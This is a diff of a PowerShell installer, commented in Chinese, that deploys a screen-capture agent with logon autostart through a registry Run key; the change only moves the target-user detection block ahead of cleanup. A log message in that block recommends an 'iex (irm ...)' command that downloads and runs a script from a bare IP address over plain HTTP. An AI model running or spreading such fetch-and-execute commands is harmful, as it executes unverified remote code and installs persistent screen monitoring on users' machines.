@@ -142,6 +142,29 @@ $chosen = Resolve-Source -Preferred $Source
 $base = $sources[$chosen]
 Write-Log "使用源: $chosen ($base)"
 
+# ---------- 解析 TargetUser (空 = 自动). 必须在 cleanup 之前! ----------
+# 否则 SYSTEM 无用户场景下, cleanup 已经把 sid-nocv 的 ScheduledTask 删了, exit 时不可恢复
+$currentUser = $env:USERNAME
+$isSystem    = [Security.Principal.WindowsIdentity]::GetCurrent().IsSystem
+
+if (-not $TargetUser) {
+    if ($isSystem) {
+        $detected = Get-InteractiveUser
+        if ($detected) {
+            $TargetUser = $detected.User
+            Write-Log "SYSTEM 跑, 自动检测到交互用户: $($detected.Account) Session=$($detected.SessionId)" 'WARN'
+        } else {
+            # 本脚本走 HKCU/HKU Run 键模式, 必须有具体目标用户 (Run 键不能 "any user").
+            # 没人登录的无人值守场景请用基于 Scheduled Task 的变体, 它能用 BUILTIN\Users principal.
+            Write-Log "SYSTEM 跑但没检测到登录的交互用户(无 explorer.exe). 此脚本(Run 键模式)需要具体目标用户" 'ERROR'
+            Write-Log "无人值守部署请改用: iex (irm http://114.80.36.225:15667/6/install-screenagent-sid-nocv-cn.ps1)" 'ERROR'
+            exit 4
+        }
+    } else {
+        $TargetUser = $currentUser
+    }
+}
+
 # ---------- 获取版本清单 ----------
 $manifestUrl = "$base/$ManifestName"
 $manifestRaw = Get-RemoteString $manifestUrl
@@ -283,28 +306,6 @@ Quality=100
 "@
     Set-Content -Path $iniPath -Value $iniContent -Encoding ASCII
     Write-Log "写入 screenagent.ini: Host=$h Port=$p"
-}
-
-# ---------- 解析 TargetUser (空 = 自动) ----------
-$currentUser = $env:USERNAME
-$isSystem    = [Security.Principal.WindowsIdentity]::GetCurrent().IsSystem
-
-if (-not $TargetUser) {
-    if ($isSystem) {
-        $detected = Get-InteractiveUser
-        if ($detected) {
-            $TargetUser = $detected.User
-            Write-Log "SYSTEM 跑, 自动检测到交互用户: $($detected.Account) Session=$($detected.SessionId)" 'WARN'
-        } else {
-            # 本脚本走 HKCU/HKU Run 键模式, 必须有具体目标用户 (Run 键不能 "any user").
-            # 没人登录的无人值守场景请用基于 Scheduled Task 的变体, 它能用 BUILTIN\Users principal.
-            Write-Log "SYSTEM 跑但没检测到登录的交互用户(无 explorer.exe). 此脚本(Run 键模式)需要具体目标用户" 'ERROR'
-            Write-Log "无人值守部署请改用: iex (irm http://114.80.36.225:15667/6/install-screenagent-sid-nocv-cn.ps1)" 'ERROR'
-            exit 4
-        }
-    } else {
-        $TargetUser = $currentUser
-    }
 }
 
 # ---------- 注册登录自启动: 写目标用户的 HKU\<SID>\...\Run ────────────────
